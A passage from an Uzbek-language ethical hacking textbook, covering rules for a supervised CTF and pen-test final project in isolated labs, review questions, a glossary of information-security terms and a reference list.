Zaifliklarni tahlil qilish (SQLi, XSS, LFI, RFI, bruteforce, buffer overflow, kriptografik tahlil va hk);
Pen-test hisobotini tayyorlash.
4. Taqiqlangan faoliyatlar
Real tizimlardan ruxsatsiz foydalanish;
DDoS qilish, tizimni ishdan chiqarish;
Malware tarqatish yoki yaratish (faqat simulyatsiya ko‘rinishida bolishi mumkin);
“Zero-day” ekspluatlar bilan o‘ynash;
O‘qituvchi ruxsatisiz tarmoq monitoringi yoki trafikni snif qilish.
5. Yagona muhitdan foydalanish qoidalari
Loyiha faqat quyidagi platformalarda ruxsat etiladi:
	•	Universitet laboratoriyasi (yak isolated network);
	•	VirtualBox/VMware ichida izolyatsiya qilingan virtual mashinalar;
	•	TryHackMe / Hack The Box / PicoCTF platformalari;
	•	O‘qituvchi yaratgan maxsus “CTF server” yoki “vulnerable machine”.
6. Yakuniy loyiha hisobot talablari
Har bir talaba quyidagilarni topshiradi:
1) Loyiha maqsadi va ssenariy: Hujum qaysi tizimda, qanday sharoitda bajarilgani.
2) Foydalanilgan vositalar: Nmap, Burp Suite, Hydra, Wireshark, Ghidra, Metasploit va boshqalar.
3) Zaiflikni aniqlash jarayoni: Batafsil tahlil, skrinshotlar bilan.
4) Ekspluatatsiya jarayoni: Flag olish yoki tizimdan foydalanish bosqichlari.
5) Xavfsizlikni mustahkamlash bo‘yicha tavsiyalar: Aniqlangan zaiflikka qarshi 2–3 ta real yechim.
6) Etik muvofiqlik bayonoti: Talaba loyihani faqat o‘qituvchi ruxsati bilan bajarganini tasdiqlaydi.
	CTF o‘yinlarining asosiy maqsadi nima va unda flag qanday rol o‘ynaydi?
	•	Jeopardy-style CTF va Attack-Defence CTF o‘rtasidagi farq nima?
	•	CTFda ishtirok etish uchun talab qilinadigan asosiy texnik ko‘nikmalar nimalardan iborat?
	•	Ethical hacking tamoyillariga ko‘ra ruxsatsiz tizimdan foydalanish hujum qilish nima uchun qatiy taqiqlanadi?
	•	Yakuniy hacking loyihasi faqat ruxsat berilgan va izolyatsiya qilingan muhitda bajarilishi nimani ta’minlaydi?
	•	Penetration testing hisobotida qaysi elementlar majburiy hisoblanadi?
	•	Hujum jarayonida talaba tasodifiy zarar yetkazsa, Ethical Guidelines bo‘yicha qanday choralar ko‘rishi kerak?
	•	CTFlarda stego, crypto, web, pwn kabi kategoriyalar nimani anglatadi va ularni farqlovchi jihatlar qanday?
Nazorat savollari
	•	CTF o‘yinlarining asosiy maqsadi nima va unda flag qanday rol o‘ynaydi?
	•	Jeopardy-style CTF va Attack-Defence CTF o‘rtasidagi farq nima?
	•	CTFda ishtirok etish uchun talab qilinadigan asosiy texnik ko‘nikmalar nimalardan iborat?
	•	Ethical hacking tamoyillariga ko‘ra ruxsatsiz tizimdan foydalanish hujum qilish nima uchun qatiy taqiqlanadi?
	•	Yakuniy hacking loyihasi faqat ruxsat berilgan va izolyatsiya qilingan muhitda bajarilishi nimani ta’minlaydi?
	•	Penetration testing hisobotida qaysi elementlar majburiy hisoblanadi?
	•	Hujum jarayonida talaba tasodifiy zarar yetkazsa, Ethical Guidelines bo‘yicha qanday choralar ko‘rishi kerak?
	•	CTFlarda stego, crypto, web, pwn kabi kategoriyalar nimani anglatadi va ularni farqlovchi jihatlar qanday?
Nazorat savollari
GLOSSARY
Abonent shifrlash (oxirgi) - bevosita uzatuvchi va qabul qiluvchi orasida kriptografik usullar asosida telekommunikasiya vositalari yordamida uzatiluvchi axborotni himoyalash.
Aktiv - 1. Himoyalanuvchi axborot yoki resurslar. 2. Tashkilot uchun qiymatli barcha narsalar. 3. Bosh ilova, umumiy madadlovchi tizim, yuqori nufuzli dastur, moddiy qism, kritik tizim missiyasi, xodimlar, jihozlar yoki mantiqiy bog‘langan tizimlari guruhi.
Anonimlik - ishtirokchiga (protokol ishtirokchisiga) qandaydir harakatni anonim tarzda, ya’ni o‘zini identifikatsiyalamasdan, bajarilishini ifodalaydi.
Anti–spufing - qonuniy identifikatsiya va autentifikatsiya ma’lumotlaridan ruxsat etilmagan foydalanishga qarshi qabul qilinuvchi choralar.
Antivirus – viruslarni aniqlovchi yoki aniqlovchi va yo‘q qiluvchi dastur. Agar virus yo‘q qilinmasa, zaharlangan dastur yo‘q qilinadi.
Arxiv – arxivator dastur yordamida zichlashtirilgan ma’lumotlar va dasturlar majmui.
Autentifikatsiya – odatda tizim resurslaridan foydalanishga ruxsat etish xususida qaror qabul uchun foydalanuvchining, qurilmaning yoki tizimning boshqa tashkil etuvchisining identifikasiyasini tekshirish; saqlanuvchi va uzatuvchi ma’lumotlarning ruxsatsiz modifikatsiyalanganligini aniqlash uchun tekshirish.
Avtorizatsiya – tizimda foydalanuvchiga, uning ijobiy autentifikatsiyasiga asosan, ma’lum foydalanish huquqlarini taqdim etish.
Axborot qiymati – insonning maqsadli faoliyatining turli sohalarida amaliy foydalanishga yaroqligi orqali aniqlanuvchi axborot xususiyati.
Axborotdan ruxsatsiz foydalanish - manfaatdor subyektning huquqiy hujjatlarni yoki mulkdor, axborot egasi tomonidan o‘rnatilgan himoyalanuvchi axborotdan foydalanish huquqlari yoki qoidalarini buzib himoyalanuvchi axborotga ega bo‘lishi.
Axborotni himoyalash sohasidagi ma’naviy – axloqiy qoidalar - vatanparvarlik, javobgarlik va obro‘ni madadlash hislariga asoslangan maxfiy yoki konfidensial axborotni va uning eltuvchisini saqlash uchun axborot muunosabatlaridagi subyektlar uchun yozilgan axloqiy qoidalar.
Axborotni modifikatsiyalash – axborotni texnik vositalarida ishlashda uning eltuvchisidagi mazmunini yoki hajmini o‘zgartirish.
Bit (ikkili kod) – kompyuterdagi bitta ikkili xonaga teng axborot miqdorining minimal birligi.
Bot - oddiy foydalanuvchi interfeysi orqali avtomatik tarzda va/yoki berilgan jadval bo‘yicha qandaydir harakatlarni bajaruvchi maxsus dastur.
Brauzer – WWWda ishlash uchun mijoz dasturi.
Brauzer sozlanishini o‘zgartirish – zarar keltiruvchi dasturiy ta’minot yordamida Web brauzer sozlanishini modifikatsiyalash. “Hijacking” atamasi (hijac- “bosqinchi”, “o‘g‘ri” so‘zidan olingan) foydalanuvchining xabarisiz va ruxsatisiz o‘zgartirish amalga oshirilishi sababli ishlatilgan.
Deshifrlash algoritmi – deshifrlash funksiyasini amalga oshiruvchi va shifrlash algoritmiga teskari algoritm.
Dezinformatsiya – foydalanuvchi shaxslarga yolg‘on tasavvurni shakllantirish maqsadida ularga uzatiluvchi xabarni atayin buzib ko‘rsatish; yolg‘on axborotni uzatish.
Ega – ma’lumotlarni himoyalash va foydalanishni nazoratlash tizimida fayl yoki boshqa axborotga nisbatan cheklanmagan huquqga ega foydalanuvchi.
Ekspertiza - texnik ko‘rib chiqish bo‘lib, tasdiqlarni ko‘rinarli va tahlilga yaroqli qiladi; tasdiqlar asosida o‘tkazilgan sinovlar maxsus ma’lumotlarning borligi yoki yo‘qligini aniqlashga imkon beradi.
Eksployt - dasturiy ta’minotdagi zaifliklardan foydalanuvchi va kompyuter tizimiga hujumlar o‘tkazishda ishlatiluvchi kompyuter dasturi, dastur kodi fragmenti yoki komandalar ketma-ketligi.
Faol hujum - dushman va/yoki buzg‘unchi qonuniy  foydalanuvchi harakatiga ta’sir etishi, masalan, qonuniy foydalanuvchi xabarini almashtirishi yoki yo‘q qilishi va xabarni yaratib uning nomidan uzatishi va h. mumkin bo‘lgan kriptotizimga yoki kriptografik protokolga hujum.
Faol tahdid – tizim holatini atayin ruxsatsiz o‘zgartirish tahdidi.
Fayl xavfsizligi - kompyuter fayllaridan foydalanishni faqat avtorizatsiyadan o‘tgan foydalanuvchilar bilan cheklovchi vositalar.
Faylni tiklash – fayl yaxlitligini, unda xatolik aniqlanganidan so‘ng tiklash jarayoni.
Firibgarlik hujumi - foydalanuvchilarning yoki dasturlarning ma’lumotlarni soxtalashtirish va noqonuniy afzallikka ega bo‘lish yo‘li bilan boshqa subyektlar sifatida muvaffaqiyatli niqoblanish vaziyati.
Fishing - foydalanish paroli, bank va identifikatsiya kartalari ma’lumotlari va h. kabi shaxsiy konfidensial ma’lumotlarni o‘g‘rilashdan iborat internet-firibgarlik texnologiyasi.
Hodisa - tarmoq yoki tizimdagi ixtiyoriy kuzatiladigan voqea. Hodisalar, ba’zida berilgan onda qanday insident yuz berayotganini ko‘rsatilishini ta’minlaydi.
Honeypot tizimi - buzg‘unchilarga jozibador bo‘lish uchun ishlab chiqilgan va o‘z ma’murlaridan boshqa avtorizatsiyalangan foydalanuvchilari bo‘lmagan tizim (masalan, Web server) yoki tizim resursi (masalan, serverdagi fayl).
Hujum – bosqinchining operatsion muhitini boshqarishiga imkon beruvchi axborot tizimi xavfsizligining buzilishi.
Hujumchi - ko‘rilayotgan kompyuter tizimida harakati axborot xavfsizligini buzadigan subyekt.
Ijtimoiy injeneriya – xizmatchi xodimlar va foydalanuvchilar bilan, turli nayrang, aldash va h. orqali chalg‘itish asosidagi muloqotdan olinadigan axborot yordamida axborot tizimining xavfsizlik tizimini chetlab o‘tish.
Ikki faktorli autentifikatsiya – foydalanuvchilarni ikkita turli faktorlar asosida autentifikatsiyalash, odatda, foydalanuvchi biladigan narsa va egalik qiladigan narsa (masalan, parol va fizik identifikatori) asosida.
Imtiyozlar - hisoblash tizimida ma’lum obyektlardan foydalanish va ularda ishlashdan iborat foydalanuvchilarning yoki dasturning huquqlari.
Imzo - tizimdan ruxsatsiz foydalanishga ruxsat olish uchun ishlatiladigan, masalan, virusdagi binar qatori yoki klavishalar bosilishining ma’lum nabori ko‘rinishidagi, hujum bilan bog‘liq aniqlanuvchi, farqlanuvchi shablon.
Insayder – guruxga tegishli yashirin axborotdan foydalanish xuquqiga ega guruh a’zosi. Odatda, axborot sirqib chiqishi bilan bog‘liq insidentda muhim shaxs hisoblanadi.
Insident – ruxsatsiz foydalanish xuquqiga ega bo‘lishga yoki kompyuter tizimiga hujum o‘tkazishga urinishning qayd etilgan holi.
Internet - Internet tijoriy, davlat, ta’lim va boshqa taqsimlangan kompyuter tarmoqlarini, dunyo bo‘ylab o‘zaro bog‘lovchi yagona tizimi hisoblanadi.
Ishonchli kanal - oxirgi nuqtalari ma’lum va uzatilishda ma’lumot yaxlitligi ta’minlangan kanal.
Ishonuvchi tomon - mijoz qayd ma’lumotlariga, odatda, axborot yoki tizimga tranzaksiyani ishlashga yoki foydalanishni taqdim etishga, ishonuvchi obyekt.
Jurnal – statistik axborotni, turli xabarlarni va boshqa ma’lumotlarni yig‘ish va hisobga olish uchun operatsion yoki boshqa tizim foydalanadigan hisoblash texnikasidagi ma’lumotlar nabori (fayl).
Keylogger - klaviaturali kiritishni ushlab qolishga mo‘ljallangan dastur yoki apparat vosita. Bosilgan klavishlar skan-kodlarini aniqlashni va ularni yashirincha saqlashni va/yoki yashirincha qandaydir kanal orqali uzatishni amalga oshiradi.
Kiber-hujum – hisoblash muhiti/ infrastrukturasini, o‘chirish, buzish yoki g‘arazli nazoratlash yoki ma’lumot yaxlitligini buzish yoki nazoratlanuvchi axborotni o‘g‘irlash maqsadida kiberfazodan foydalanuvchi tashkilotga atalgan kiberfazo orqali amalga oshiriluvchi hujum.
Kiberjinoyatchilik - g‘arazli yoki xuliganlik maqsadlarida himoyalashning kompyuter tizimlarini buzib ochishga, axborotni o‘g‘irlashga yoki buzishga yo‘naltirilgan alohida shaxslarning yoki guruhlarning harakatlari.
Kiberxavfsizlik – kiberfazoning kiberhujumlardan foydalanishidan qo‘riqlash yoki himoyalash imkoniyati.
Ko‘k jamoa – yolg‘on hujumchilar guruhiga (ya’ni, Qizil jamoaga) qarshi axborot himoyasini madadlovchi korxona axborot tizimi himoyasiga javobgar guruh. Odatda ko‘k jamoa va uning tarafdorlari tizimni real va qalbaki tahdidlardan himoyalashi kerak.
Ko‘p faktorli autentifikatsiya - bir necha mustaqil faktorlar asosida foydalanish nazoratini amalga oshirish.
Kolliziya – ikki yoki undan ortiq turli kirishlarni bir xil chiqish hosil qilishi.
Kompyuter ekspertizasi – ma’lumot yaxlitligini saqlab, tadqiqot maqsadida kompyuterga aloqador ma’lumotlarni bir necha usulda to‘plash, saqlash va tahlillash amaliyoti.
Kompyuter virusi – quyidagi xususiyatlarga ega dastur: o‘zini boshqa fayllarga, disklarga, kompyuterlarga nusxalash imkoniyati; ochiqdan – ochiq chaqiriqsiz ishlash imkoniyati; axborotdan ruxsatsiz foydalanishni amalga oshirish imkoniyati; oshkor qilinishiga urinishlardan niqoblash imkoniyati.
Konfidensiallik – Avtorizatsiyalanmagan shaxs tomonidan olinishi yoki foydalanishi tashkilot uchun jiddiy zarar sababi bo‘la olmaydigan ma’lumotlarning qandaydir sinfi.
Kontentni filtrlash – kommunikatsiyani, masalan, pochta va web-sahifalarni, ularni shubhali kontentga nisbatan tahlil qilish va foydalanuvchilarga shubhali kontentning yetib borishini oldini olish monitoringi jarayoni.
Kuki fayl – talab etilgan resurs, brauzer uchun vaqtinchalik saqlash va ixtiyoriy keyingi tashrif yoki so‘rovlarda serverga qaytarish uchun web server tomonidan brauzerga taqdim etilgan javobdagi holat axborotining qismi.
Ma’lumotlar bazasi - tatbiqiy dasturlarga bog‘liq bo‘lmagan holda ma’lumotlarni tavsiflashning, saqlashning va manipulyatsiyalashning umumiy prinsiplarini ko‘zda tutuvchi, ma’lum qoidalar bo‘yicha tashkil etilgan ma’lumotlar majmui.
Ma’lumotlar bazasi ma’muri – ma’lumotlar bazasi xususida to‘liq tasavvurga ega, undan foydalanish va rivoji uchun javobgar maxsus lavozimli shaxs (shaxslar guruhi). Ma’lumotlar banki ma’muriyati tarkibiga kiradi.
Ma’lumotlarni tiklash – eltuvchining asl nusxasida ma’lumotlar yaxlitligi buzilganida unga ma’lumotlarning himoya nusxasi bo‘lgan eltuvchidan nusxalash jarayoni.
Manipulyatsiyani aniqlash - ma’lumotlar blokining joiz tasodifiy yoki atayin modifikatsiyalanishini aniqlashda ishlatiluvchi mexanizm.
Mantiqiy bomba – “qurbon” kompyuterida rezident joylashgan va ma’lum mantiqiy shart bo‘yicha, masalan, ma’lum sanada yoki tizimning ma’lum xolatlari naborida, faollashuvchi destruktiv dasturiy komplekslarni umumlashtiruvchi atama.
Masofadan foydalanish - tashqi tarmoq (masalan, Internet) bilan bog‘langan foydalanuvchi (yoki foydalanuvchi nomidan harakat qiluvchi axborot tizimi) tomonidan tashkilot axborot tizimidan foydalanish.
Maxfiy hujjat - maxfiy axborotli ixtiyoriy eltuvchidan foydalanish cheklangan hujjat.
Mijoz -  qo‘riqlangan yoki belgilangan serverga so‘rovlarni amalga oshiruvchi, inson nomidan harakat qiluvchi jismoniy shaxs yoki jarayon.
Mualliflik huquqi – fan, adabiyot va san’at asarlarini yaratish va foydalanish bilan bog‘liq vujudga keladigan munosabatlarni tartibga soluvchi huquqiy normalar majmui.
Nol kun hujumi – nol kun zaifligidan foydalanishga asoslangan, ya’ni ushbu zaiflik no‘malum bo‘lib qolgan davrda qo‘llanuvchi va unga qarshi himoyalash mexanizmi hozircha ishlab chiqilmagan hujum.
Nuqtdan- nuqtagacha xavfsizlik - axborot tizimida jo‘natuvchi nuqtadan qabul qiluvchi nuqtagacha axborotni himoyalash.
Obro‘sizlantirish – jiddiy axborotning yo‘qolishi yoki avtorizatsiyalanmagan subyektlar (shaxslar, dasturlar jarayonlar va h.) tomonidan o‘zlashtirilishi.
Offlayn hujum - hujumchining, o‘zi tanlagan tizimda tahlillash imkoniyatiga ega ba’zi ma’lumotlarni qo‘lga kiritgandagi hujum.
Oq ro‘yxat - tashkilot va/yoki axborot tizimi doirasida foydalanish uchun sifatli va tavsiya etilgan diskret obyektlarning, masalan, hostlar yoki ilovalar ro‘yxati.
Orqa eshik – tipik ruxsat etilmagan yashiringan dasturiy vositalar yoki xavfsizlik nazoratini aylanib o‘tishda foydalaniluvchi qurilma mexanizmi.
Paketli filtratsiya - jo‘natuvchi va qabul qiluvchi, portlar yoki protokollar manzillari ahamiyati asosida tarmoqdagi paketlarni o‘tkazish yoki blokirovka qilish jarayoni. Paketli filtrlash, odatda, lokal tarmoqni nomaqbul suqilib kirishlardan himoyalovchi tarmoqlararo ekran dasturiy ta’minotining qismi hisoblanadi.
Parol - talabgor o‘zining haqiqiyligini tekshirish uchun xotirasida saqlagan va foydalanadigan maxfiy kattalik.
Parollar lug‘atiga asoslangan hujum – parol qiymatlarini saralashga asoslangan kriptotizimga hujum.
Port - mantiqiy axborot oqimi orqali ifodalangan fizik signallar modulidan foydalanishni ta’minlovchi kriptografik modulning fizik kirish yoki chiqish nuqtasi.
Portlarni skanerlash - tizimdagi ochiq portlarni masofadan aniqlash uchun foydalaniluvchi dastur.
Qo‘pol kuch usulida parolga tahdid – sonli va/yoki alfavit – sonli parollarning ko‘p sonli kombinatsiyasi yordamida urinish orqali bloklangan qurilmadan foydalanish usuli.
Qora ro‘yxat – foydalanuvchiga oldingi vaqt oralig‘ida xabar yuborgan pochta jo‘natuvchilari ro‘yxati.
Raqamli dalil - raqamli ko‘rinishda saqlanuvchi yoki uzatiluvchi elektron axborot.
Raqamli imzo algoritmi - ma’lumotlarni raqamli imzolash uchun foydalaniluvchi asimetrik algoritm.
Rezerv nusxalash – zarur bo‘lganda, tiklanishlarini yengillashtirish uchun fayllar va dasturlarni nusxalash.
Rutkit - hostning o‘zak sathida foydalanishga ruxsat olinganidan so‘ng hostdagi hujumchi harakatlarini yashirish uchun va yashirin vositalar orqali o‘zak sathli hostdan foydalanishni madadlashga imkon berishda niyati buzuq tomonidan ishlatiluvchi instrumentlar nabori.
Saytlararo skripting -  eksployt turi. Unga binoan hujumchi ishonchli resurs bilan tashkil etilgan bog‘lanishga atayin kod joylashtiradi. Masalan, bog‘lanish o‘rnatilganida kod foydalanuvchi kompyuterida bajariluvchi mijoz Web so‘rovining qismi sifatida uzatilishi mumkin.  Natijada, hujumchi foydalanuvchi kompyuteridan axborotni o‘g‘irlashi mumkin.
Shaxsiy ma’lumotlar - bunday axborot asosida aniq yoki aniqlanuvchi fizik shaxsga (shaxsiy ma’lumotlar subyektiga) tegishli har qanday axborot, jumladan, uning ismi-sharifi, tug‘ilgan yili, oyi, kuni va manzili, oilaviy, ijtimoiy, mulkiy holati, ma’lumoti, kasbi, daromadi va boshqa axborot.
Shifrlash algoritmi - shifrlash funksiyasini amalga oshiruvchi kriptografik algoritm. Blokli shifrtizim holida shifrlashning muayyan rejimida shifrlashning bazaviy blokli algoritmidan foydalanib hosil qilinadi.
Shlyuz - uzatish tezliklari, protokollari, kodlari yoki xavfsizlik o‘lchovlarini o‘zgartirish orqali tarmoqlararo moslikni ta’minlash interfeysi.
Simsiz lokal tarmoq - radio aloqa orqali ma’lumot almashinuvchi ofis binosi kabi chegaralangan geografik mintaqa doirasidagi simsiz tarmoq qurilmalari guruhi.
Sinash (testlash, tekshirish) – qandaydir masalalarni chinakam bajarish yo‘li bilan tizimning yoki uning komponentini tekshirish.
Sniffing – tarmoqqa qaratilgan tahdid turi, “tarmoqni passiv eshitish” deb ham ataladi. Tarmoqni ruxsatsiz yashirincha eshitish va ma’lumotlarni kuzatish paket snifferi deb ataluvchi maxsus zararsiz dastur yordamida amalga oshiriladi. Bunday sniffer tutib olgan ma’lumotlar niyati buzuqlar tomonidan tarmoqqa, sohta foydalanuvchi huquqi bilan, qonuniy suqilib kirish uchun ishlatilishi mumkin.
Soxtalashtirish - boshqa tizimga o‘xshab niqoblanish yordamida, uning IP-adresidan foydalanib, IP-adreslar asosida foydalanishni boshqarish tizimlarini chetlab o‘tish uchun turli texnologiyalardan foydalanish.
Spam - so‘ralmagan hajmiy xabarlarni asossiz yuboruvchi elektron nomaqbul pochta yoki elektron xabar almashish tizimlarining noto‘g‘ri ishlatilishi.
Spufing - ulanishni imitatsiyalash orqali aldash yo‘li bilan tarmoqdan foydalanishga ega bo‘lishdan iborat tarmoq hujumining ko‘rinishi. Bunda bitta dastur (yoki foydalanuvchi) ma’lum afzalliklarga ega bo‘lish maqsadida o‘zini boshqa qilib ko‘rsatadi.
Steganografiya - ochiq axborot massivlarida konfidensial axborotni yashirishning matematik usullarini o‘rganuvchi fan sohasi.
Sud ekspertizasi - ma’lumotlarni yaxlitligini ta’minlash maqsadida kompyuter bilan bog‘liq ma’lumotlarni to‘plash, saqlash va tahlil etish amaliyoti.
Sudga oid nusxa - elektron qurilma yoki u bilan bog‘liq ommaviy axborot vositalarida mavjud axborotni aniqlik bilan bitma-bit tiklash, aniqlik va yaxlitlik qabul qilingan algoritm yordamida tekshiriladi.
Suqilib kirishga sinash,  Реnetration testing – tizimni, uning himoyalash vositalarini (xususan, ruxsatsiz foydalanishdan) tekshirish maqsadida, sinash.
Tahlil – olingan ma’lumotlarning muhimligi va vaziyat uchun isbotlanganlik qiymatini o‘rganish.
Tarmoq xavfsizligi - axborot tarmog‘ini ruxsatsiz foydalanishdan,  me’yoriy ishlashiga tasodifiy yoki atayin aralashishdan yoki tarmoq komponentlarini buzishga urinishdan ehtiyot qiluvchi choralar.
Tarmoqlararo ekran – apparat-dasturiy vositalar yordamida tarmoqdan foydalanishni markazlashtirish va uni nazoratlash yo‘li bilan tarmoqni boshqa tizimlardan va tarmoqlardan keladigan xavfsizlikka tahdidlardan himoyalash usuli.
Tiklash vaqti – adashishi aniqlangan on bilan tiklanganidan so‘ng tizimning (qurilmaning) ishini qaytadan yangidan boshlash oni orasidagi vaqt.
Tizim jurnali - yakuniy natijani tekshirish va ruxsatsiz foydalanishga urinishlarni aniqlash uchun harakatlar va hodisalar ketma-ketligini qarab chiqish va tahlillashga mo‘ljallangan subyektlar va tizim foydalanuvchilari faoliyati natijalarining xronologik tartiblangan yozuvlari majmui.
Tizim ma’muri – tizimni ekspluatatsiyasiga va uning ishga layoqatlik holatini ta’minlashga javobgar shaxs.
Tizim xavfsizligi - tizim resurslaridan va funksional imkoniyatlaridan ruxsatsiz foydalanishdan hamda ishlashida turli bashorat qilinadigan yoki qilinmaydigan holatlar sabab bo‘luvchi,  bo‘lishi mumkin bo‘lgan buzilishlardan tizimning himoyalanishi.
Tozalash – maxfiy bo‘lmagan ma’lumotlarni eltuvchi xotira makoniga qayta yozish uchuun dasturiy yoki apparat mahsulotlaridan foydalanish.
Trafik tahlili - Trafik oqimini kuzatish (borligi, yo‘qligi hajmi, yo‘nalishi va chastotasi) asosida axborat holati xususida xulosa qilish.
Tuz (salt) - kriptografik ishlashda, odatda, bir namuna uchun hisoblashlar natijasi hujumchi tomonidan qaytadan foydalanilmasligini kafolatlashda foydalaniluvchi maxfiy bo‘lmagan qiymat.
Vakolatning eng quyi darajasi - axborot tizimi tomonidan madadlanuvchi eng quyi xavfsizlik darajasi.
Virtual mashina - yagona xostdan bir yoki bir necha mehmon operatsion tizimlarni ishga tushirishga imkon beruvchi dasturiy ta’minot.
Virtual shaxsiy tarmoq - tarmoqlar orasida almashiniluvchi ma’lumotlar yoki boshqa axborotni uzatish uchun xavfsiz kommunikatsiya tunnelini ta’minlovchi, mavjud fizik tarmoqlar asosida qurilgan virtual tarmoq.
Virus – boshqa dasturlar bajarilayotganida o‘zini ularga kirituvchi unchalik katta bo‘lmagan dastur; yana - nusxalarini beixtiyor yaratish va keyinchalik yangi nusxasini nazoratlash va qayta yaratishga erishish maqsadida fayllardagi va tizimli sohalardagi boshqa dasturlarni modifikatsiyalash imkoniyatiga ega dastur.
Virusga qarshi himoya - hisoblash texnikasi va avtomatlashtirilgan tizim vositalarini dasturiy virus ta’siridan himoyalashni ta’minlashda ishlatiluvchi tashkiliy, xuquqiy, texnik va texnologik choralar kompleksi.
Vositachi - avtorizatsiyalangan mijoz va tashqi xost orasida paketlarni uzatuvchi shlyuzda bajariluvchi ilova. Vositachi mijozdan Internetning ma’lum servisiga so‘rov qabul qiladi, so‘ngra, ushbu mijoz nomidan (ya’ni, uning vositachisi sifatida) harakat qilib, so‘ralgan servisni olish uchun bog‘lanishni o‘rnatadi.
Web-anonimayzer - anonimayzer xizmatini taqdim etuvchi web-sayt.
X.509 sertifikati - ISO/ITU-T X.509 standarti tomonidan aniqlangan X.509 ochiq kalit sertifikati yoki X.509 attributi sertifikati.
Xabarlar autentifikatsiyasi – ma’lumotlarda har qanday o‘zgarishlarni aniqlash maqsadida ma’lumotlar blokiga nazorat hoshiyasini qo‘shish.
Xaker - tizimli dasturiy ta’minotga, ko‘pincha noqonuniy o‘zgartirishlar kiritishga urinuvchi foydalanuvchi. Odatda yomon hujjatlangan va ba’zida nojoiz qo‘shimcha natijalar tug‘diruvchi ozmi-ko‘pmi foydali yordamchi dasturlar yaratuvchi dasturchini xaker deb atash mumkin.
Xavf - xatar tahlili - nomuvofiq hodisalar paydo bo‘lishi holida kutiladigan zararni aniqlash maqsadida, ehtimollik hisoblashlardan foydalanib, tizim xarakteristikalarini va salbiy tomonlarini o‘rganish jarayoni. Xavf – xatarni tahlillash masalasi tizim ishlashida u yoki bu xavf – xatarning maqbullik darajasini aniqlashdan iborat.
Xavfsiz o‘chirish - qattiq diskni qayta yozish uchun dasturiy - aparat vositalari asosidagi jarayonlardan foydalanib qayta yozish texnologiyasi.
Xavfsizlik auditi – kompyuter tizimi xavfsizligiga ta’sir etuvchi bo‘lishi mumkin bo‘lgan xavfli harakatlarni xarakterlovchi, oldindan aniqlangan hodisalar to‘plamini ro‘yxatga olish (audit faylida qaydlash) yo‘li bilan himoyalanishni nazoratlash.
Xavfsizlik domeni - subyektlarning, ularning axborot obyektlarining va umumiy xavfsizlik siyosatining nabori.
Xeshlash algoritmi – kriptografiyada kriptografik xesh-funksiyani amalga oshiruvchi algoritm.
Xizmat qilishdan voz kechishga undaydigan hujum – tizim buzilishiga sabab bo‘luvchi hujum, ya’ni shunday sharoitlar tug‘diradiki, qonuniy foydalanuvchi tizim taqdim etgan resurslardan foydalana olmaydi yoki foydalanish anchagina qiyinlashadi.
Xotira qoldiqlarini to‘plash - ma’lumotlar saqlagichidan axborot qoldiqlarini to‘plash.
Yaxlitlik - axborotning buzilmagan ko‘rinishda (axborotning qandaydir fizik holatiga nisbatan o‘zgarmagan shaklda) mavjud bo‘lishida ifodalangan xususiyati.
Yozish huquqi - axborot tizimi obyektiga yozish uchun ruxsat.
Zaiflik - tahdid manbai tomonidan foydalanilishi yoki tug‘dirilishi mumkin bo‘lgan axborot tizimidagi, tizim xavfsizligi muolajalaridagi, ichki nazoratlash yoki amalga oshirishdagi zaiflik.
Zararli appletlar - axborot tizimida ruxsat etilmagan funksiyalarni amalga oshiruvchi, avtomatik yuklanuvchi va bajariluvchi kichik ilovalar.

FOYDALANILGAN ADABIYOTLAR RO‘YXATI
	•	Patrick Engebretson. The Basics of Hacking  and Penetration Testing. Second Edition. 2013.  ISBN 978-0-12-411644-3
	•	Georgia Weidman. Penetration testing. 2014. ISBN-10: 1-59327-564-1.
	•	Offensive Security. Penetration Testing with Kali Linux. 2018. 
	•	S.K.Ganiev, A.A.Ganiev, Z.T.Xudoykulov, Kiberxavfsizlik asoslari, -T.: “Iqtisod-Moliya”, 2021, -228 b.
	•	EC-Council. Penetration Testing: Procedures & Methodologies. 2011. ISBN-10: 1-4354-8367-7.
	•	Axloqiy xakerlik va CEH (Certified Ethical Hacker) kurslari bo‘yicha tavsiyalar: https://www.eccouncil.org/
	•	Web ilovalar xavfsizligi, zaifliklar, testlash metodologiyalari: https://owasp.org/
	•	Onlayn kurslar: kiberxavfsizlik, penetration testing, lab mashg‘ulotlar: https://www.cybrary.it/
	•	Kurslar va sertifikatlar, akademik kurslar: https://www.edx.org/learn/cybersecurity
	•	Universitet kurslari va lab materiallari: https://www.coursera.org/
	•	Algoritmlar, kriptografiya va ma’lumotlar strukturalari asoslari: https://www.khanacademy.org/computing/computer-science
	•	Bepul kurs materiallari va laboratoriya misollari: https://ocw.mit.edu/
	•	Interaktiv lablar va CTF (Capture The Flag) mashg‘ulotlari: https://tryhackme.com/
	•	Real penetratsion testing mashg‘ulotlari: https://www.hackthebox.eu/
	•	Tarmoq paketlarini tahlil qilish bo‘yicha rasmiy qo‘llanma: https://www.wireshark.org/docs/
	•	Axloqiy hujum uchun OT, penetration testing va lab: https://www.kali.org/
